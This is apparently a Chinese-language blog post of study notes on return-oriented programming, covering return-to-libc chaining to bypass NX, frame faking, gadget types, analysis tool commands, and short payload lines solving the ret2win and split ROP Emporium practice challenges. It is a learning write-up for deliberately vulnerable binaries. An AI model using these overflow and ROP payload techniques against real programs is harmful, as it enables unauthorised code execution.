<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/images/site.webmanifest">
  <meta name="msapplication-config" content="/images/browserconfig.xml">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="ç®€å•çš„ROPå­¦ä¹ ï¼Œæ²¡æœ‰å¼€å¯PIE Bypassing NX bit using chained return-to-libchttps:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;05&#x2F;08&#x2F;bypassing-nx-bit-using-chained-return-to-libc&#x2F; system address + exit address + system+argsexitç›¸">
<meta property="og:type" content="article">
<meta property="og:title" content="&lt;&lt;åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜">
<meta property="og:url" content="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/index.html">
<meta property="og:site_name" content="FINSENTY54">
<meta property="og:description" content="ç®€å•çš„ROPå­¦ä¹ ï¼Œæ²¡æœ‰å¼€å¯PIE Bypassing NX bit using chained return-to-libchttps:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;05&#x2F;08&#x2F;bypassing-nx-bit-using-chained-return-to-libc&#x2F; system address + exit address + system+argsexitç›¸">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s3.ax1x.com/2021/01/09/sMz61K.png">
<meta property="og:image" content="https://ropemporium.com/image/example_gotplt_section.png">
<meta property="article:published_time" content="2021-01-11T06:27:27.000Z">
<meta property="article:modified_time" content="2021-01-11T06:30:50.851Z">
<meta property="article:author" content="finsenty54">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/09/sMz61K.png">


<link rel="canonical" href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title><<åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜ | FINSENTY54</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-135283153-1');
      }
    </script>






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="FINSENTY54" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">FINSENTY54</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">å‡ å¤„æ—©èºäº‰æš–æ ‘ï¼Œè°å®¶æ–°ç‡•å•„æ˜¥æ³¥ã€‚</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾<span class="badge">16</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»<span class="badge">6</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£<span class="badge">74</span></a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypassing-NX-bit-using-chained-return-to-libc"><span class="nav-number">1.</span> <span class="nav-text">Bypassing NX bit using chained return-to-libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">2.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">ROPå®šä¹‰ï¼š</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E7%94%A8%E7%9A%84gadget"><span class="nav-number">2.2.</span> <span class="nav-text">æœ‰ç”¨çš„gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Loading-a-constant-into-register"><span class="nav-number">2.2.1.</span> <span class="nav-text">Loading a constant into register</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Loading-from-memory"><span class="nav-number">2.2.2.</span> <span class="nav-text">Loading from memory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Storing-into-memory"><span class="nav-number">2.2.3.</span> <span class="nav-text">Storing into memory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Arithmetic-operations"><span class="nav-number">2.2.4.</span> <span class="nav-text">Arithmetic operations</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#System-call"><span class="nav-number">2.2.5.</span> <span class="nav-text">System call</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="nav-number">2.2.6.</span> <span class="nav-text">å‘½ä»¤ï¼š</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0ROP%E7%9A%84%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0ropemporium"><span class="nav-number">3.</span> <span class="nav-text">å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Confirming-protections"><span class="nav-number">3.1.</span> <span class="nav-text">Confirming protections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Function-names-%E7%AC%A6%E5%8F%B7%E8%A1%A8symbols"><span class="nav-number">3.2.</span> <span class="nav-text">Function names ç¬¦å·è¡¨symbols</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Strings"><span class="nav-number">3.3.</span> <span class="nav-text">Strings</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%EF%BC%9A"><span class="nav-number">3.4.</span> <span class="nav-text">é¢˜ç›®ï¼šï¼š</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2win"><span class="nav-number">3.5.</span> <span class="nav-text">ret2win</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#split"><span class="nav-number">3.6.</span> <span class="nav-text">split</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2gadget"><span class="nav-number">3.7.</span> <span class="nav-text">å¦‚ä½•æœç´¢gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#radare2%E4%B8%AD"><span class="nav-number">3.7.1.</span> <span class="nav-text">radare2ä¸­</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROPgadget"><span class="nav-number">3.7.2.</span> <span class="nav-text">ROPgadget</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callme"><span class="nav-number">3.8.</span> <span class="nav-text">callme</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PLT-%E5%92%8C-GOT-PLT"><span class="nav-number">4.</span> <span class="nav-text">PLT å’Œ GOT.PLT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#plt-%E8%8A%82"><span class="nav-number">4.1.</span> <span class="nav-text">.plt èŠ‚</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="nav-number">4.2.</span> <span class="nav-text">æ”»å‡»é˜²å¾¡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#got"><span class="nav-number">4.3.</span> <span class="nav-text">.got</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x86-get-pc-thunk-ax"><span class="nav-number">5.</span> <span class="nav-text">__x86.get_pc_thunk.ax</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-WIKI-ROP"><span class="nav-number">6.</span> <span class="nav-text">CTF-WIKI ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4"><span class="nav-number">6.1.</span> <span class="nav-text">å‘½ä»¤</span></a></li></ol></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="finsenty54"
      src="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
  <p class="site-author-name" itemprop="name">finsenty54</p>
  <div class="site-description" itemprop="description">blog</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Finsenty54" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;Finsenty54" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:fin12138@gmail.com" title="E-Mail â†’ mailto:fin12138@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Finsenty54" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2021/01/11/%E5%9F%BA%E6%9C%ACROP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
      <meta itemprop="name" content="finsenty54">
      <meta itemprop="description" content="blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="FINSENTY54">
    </span>

    
    
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          <<åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-01-11 14:27:27 / ä¿®æ”¹æ—¶é—´ï¼š14:30:50" itemprop="dateCreated datePublished" datetime="2021-01-11T14:27:27+08:00">2021-01-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/rop-emporium/" itemprop="url" rel="index"><span itemprop="name">rop_emporium</span></a>
        </span>
    </span>

  
    <span id="/2021/01/11/%E5%9F%BA%E6%9C%ACROP/" class="post-meta-item leancloud_visitors" data-flag-title="<<åŸºæœ¬ROP_ropemporiumå‰ä¸‰é¢˜" title="é˜…è¯»æ¬¡æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
      <span class="leancloud-visitors-count"></span>
    </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valineï¼š</span>
    
    <a title="valine" href="/2021/01/11/%E5%9F%BA%E6%9C%ACROP/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/11/%E5%9F%BA%E6%9C%ACROP/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>7.7k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>7 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>ç®€å•çš„ROPå­¦ä¹ ï¼Œæ²¡æœ‰å¼€å¯PIE</p>
<h2 id="Bypassing-NX-bit-using-chained-return-to-libc"><a href="#Bypassing-NX-bit-using-chained-return-to-libc" class="headerlink" title="Bypassing NX bit using chained return-to-libc"></a>Bypassing NX bit using chained return-to-libc</h2><p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p>
<p>system address + exit address + system+args<br>exitç›¸å½“äºä¸‹ä¸€æ­¥åœ°å€ï¼Œå› ä¸ºä¸æ˜¯è°ƒç”¨call, ä¸ä¼šå‹å…¥ä¸‹ä¸€æ­¥åœ°å€</p>
<a id="more"></a>
<p>chaining seteuid, system and exit</p>
<p>é—®é¢˜ï¼š<br>1 seteuid_arg should be<code> zero</code><br>2 place function argument of both libc functionsï¼Œï¼Œï¼Œ a function argument of one libc function and an address of another libc function which is obviously not possible</p>
<p>seteuid_addr + system_addr + <code>seteuid_addr / exit_addr </code>+ system_arg<br> seteuid_addr / exit_addr è¿™é‡Œå†²çªäº†ï¼Œå½“ç„¶æ˜¯å¯ä»¥èˆå¼ƒexitçš„</p>
<p>è§£å†³é—®é¢˜2ï¼š<br><a target="_blank" rel="noopener" href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a><br>ESP Lifting<br><code>Frame Faking</code></p>
<p>esp lifting technique binary should be compiled without frame pointer (-fomit-frame-pointer) support.</p>
<p>Frame Fakingï¼š</p>
<pre><code>ç”¨â€œleave retâ€ instruction è¦†ç›–è¿”å›åœ°å€

leave = mov esp,ebp ; pop ebp
ret = pop EIP</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sMz61K"><img src="https://s3.ax1x.com/2021/01/09/sMz61K.png" alt="sMz61K.png"></a></p>
<p>ç¬¬ä¸€æ¬¡æ‰§è¡Œleave;retæ—¶ï¼Œæ­¤æ—¶ebpå·²ç»æ˜¯fake_ebp1çš„åœ°å€å€¼ï¼Œæ‰§è¡Œå®Œleaveåï¼Œespæ˜¯seteuid_addrçš„åœ°å€ï¼Œebpæ˜¯fake_ebp2çš„åœ°å€å€¼ï¼Œæ‰§è¡Œretåï¼Œå°†<code>seteuid_addræ¨å‘eip</code>ï¼Œå‚æ•°åœ¨ebp+0x4ï¼›ä¹‹ååŒç†ï¼Œå¯ä»¥æ‰§è¡Œsystem()</p>
<p>è§£å†³é—®é¢˜1ï¼š<br>strcpy which copies a NULL byte into seteuid_argâ€™s stack location<br>using sprintf NULL byte is copied in to seteuid_argâ€™s stack location</p>
<p>ROP<br>system(â€œ/bin/shâ€)</p>
<p>push binsh_addr<br>call system</p>
<p>call system=<br>push eip+5<br>jmp system</p>
<p>æ‰€ä»¥æ ˆä¸­systemåœ°å€è¦å’Œå‚æ•°éš”å››ä¸ªå­—èŠ‚ï¼Œå› ä¸ºä¸­é—´è¿˜è¦æ”¾è¿”å›åœ°å€</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></p>
<h3 id="ROPå®šä¹‰ï¼š"><a href="#ROPå®šä¹‰ï¼š" class="headerlink" title="ROPå®šä¹‰ï¼š"></a>ROPå®šä¹‰ï¼š</h3><p>utilizing <strong>small instruction sequences **available in either the binary or libraries linked to the application called **gadgets</strong></p>
<p>ROP gadgets are small instruction sequences <strong>ending with a â€œretâ€ instruction â€œc3â€</strong>.</p>
<p>The ROP gadget has to end with a â€œretâ€ to enable us to perform multiple sequences. Hence it is called** return oriented.**<br>æ‰€ä»¥æ‰å«return , gadgetåé¢éƒ½è·Ÿç€ret</p>
<h3 id="æœ‰ç”¨çš„gadget"><a href="#æœ‰ç”¨çš„gadget" class="headerlink" title="æœ‰ç”¨çš„gadget"></a>æœ‰ç”¨çš„gadget</h3><p>1- We search the binary for all â€œretâ€ (c3) byte.<br>2- We go backwards to see if the previous byte contains a valid instruction. We reverse to the maximum number of bytes that can make a valid instruction (20 bytes).<br>3- We then record all valid instruction sequences found in the binary or linked libraries.</p>
<h4 id="Loading-a-constant-into-register"><a href="#Loading-a-constant-into-register" class="headerlink" title="Loading a constant into register"></a>Loading a constant into register</h4><p>POP eax; ret;</p>
<p>æ ˆ;<br>Address of POP EAX/RET gadget<br>0xdeadbeef<br>Address of next gadget</p>
<h4 id="Loading-from-memory"><a href="#Loading-from-memory" class="headerlink" title="Loading from memory"></a>Loading from memory</h4><p>mov ecx,[eax]; ret</p>
<h4 id="Storing-into-memory"><a href="#Storing-into-memory" class="headerlink" title="Storing into memory"></a>Storing into memory</h4><p>Mov [eax],ecx; ret</p>
<h4 id="Arithmetic-operations"><a href="#Arithmetic-operations" class="headerlink" title="Arithmetic operations"></a>Arithmetic operations</h4><p>add eax,0x0b; ret<br>xor edx,edx;ret</p>
<h4 id="System-call"><a href="#System-call" class="headerlink" title="System call"></a>System call</h4><p>int 0x80; ret<br>call gs:[0x10]; ret</p>
<h4 id="å‘½ä»¤ï¼š"><a href="#å‘½ä»¤ï¼š" class="headerlink" title="å‘½ä»¤ï¼š"></a>å‘½ä»¤ï¼š</h4><p>what libs are linked to the binary<br>gdb:<br><code>info files</code></p>
<pre><code>ps -aux | grep rop2
cat /proc/28119/maps</code></pre>
<p> system call number of execve() is â€œ11â€ or â€œ0xbâ€<br> linux system call numbers in â€œ/usr/include/i386-linux-gnu/asm/unistd_32.h â€œ<br>grep execve</p>
<p>it wont affect the command â€œ/bin/shâ€ is as<br>â€œ/bin//shâ€.</p>
<p><code>ROPradget --strings </code></p>
<h2 id="å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium"><a href="#å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium" class="headerlink" title="å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium"></a>å­¦ä¹ ROPçš„ç»ƒä¹ å¹³å°ropemporium</h2><p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p>
<p>èµ·æ‰‹å¼å‘½ä»¤ï¼›ï¼›</p>
<h3 id="Confirming-protections"><a href="#Confirming-protections" class="headerlink" title="Confirming protections"></a>Confirming protections</h3><pre><code>$ rabin2 -I &lt;binary&gt;
$ pwn checksec &lt;binary&gt;</code></pre>
<h3 id="Function-names-ç¬¦å·è¡¨symbols"><a href="#Function-names-ç¬¦å·è¡¨symbols" class="headerlink" title="Function names ç¬¦å·è¡¨symbols"></a>Function names ç¬¦å·è¡¨symbols</h3><pre><code>$ rabin2 -i &lt;binary&gt;

$ nm -u &lt;binary&gt;

$ nm ret2win|grep &#39; t &#39;
Listing just those functions written by the programmer is harder, a rough approximation could be:

$ rabin2 -qs &lt;binary&gt; | grep -ve imp -e &#39; 0 &#39;
-s              symbols
grep
-q              be quiet, just show fewer data
-v, --invert-match        select non-matching lines
-e, --regexp=PATTERNS     use PATTERNS for matching</code></pre>
<h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>æŸ¥æ‰¾ç¨‹åºä¸­å­—ç¬¦ä¸²</p>
<ol>
<li><p><code>strings -d ./ret2win32</code></p>
</li>
<li><p><code>$ rabin2 -z split</code><br>åç§»åœ°å€éƒ½ç»™å‡ºäº†</p>
</li>
<li><p><code>ROPgadget --bianry --strings &#39;/bin/sh&#39;</code></p>
</li>
</ol>
<p>dmesg [options]<br>Display or control the kernel ring buffer.<br>For a quick and dirty confirmation of how many bytes are needed to cause an overflow </p>
<h3 id="é¢˜ç›®ï¼šï¼š"><a href="#é¢˜ç›®ï¼šï¼š" class="headerlink" title="é¢˜ç›®ï¼šï¼š"></a>é¢˜ç›®ï¼šï¼š</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/106619419">https://blog.csdn.net/SmalOSnail/article/details/106619419</a><br><a target="_blank" rel="noopener" href="https://github.com/TaQini/rop_emporium/blob/master/tasks">https://github.com/TaQini/rop_emporium/blob/master/tasks</a><br>å¤§ä½¬ä»£ç </p>
<p><a target="_blank" rel="noopener" href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a><br>æˆ‘çš„è§£é¢˜ä»£ç </p>
<h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p><code>p.sendlineafter(&#39;&gt;&#39;,b&#39;A&#39;*40+p64(0x00400756))</code><br>ä¸ç”¨è€ƒè™‘æˆªæ–­ï¼Ÿï¼Ÿ pwntoolsè‡ªè¡Œè§£å†³ï¼Œå‰å®³ğŸ‘</p>
<h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>32ä½<br>    payload += p32(system) +bâ€™aâ€™*4+ p32(catflag)<br>ä¸­é—´åº”è¯¥å†åŠ å››ä¸ªå­—èŠ‚ï¼Œä½œä¸ºè¿”å›åœ°å€</p>
<p>64ä½ä¸‹ä¼ å‚</p>
<pre><code>[0x00400742]&gt; pdf
â”Œ 17: sym.usefulFunction ();
â”‚           0x00400742      55             push rbp
â”‚           0x00400743      4889e5         mov rbp, rsp
â”‚           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; &quot;/bin/ls&quot; ; const char *string
â”‚           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
â”‚           0x00400750      90             nop
â”‚           0x00400751      5d             pop rbp
â””           0x00400752      c3             ret</code></pre>
<p>å­—ç¬¦ä¸²ä¼ åˆ°äº† <code>$edi</code></p>
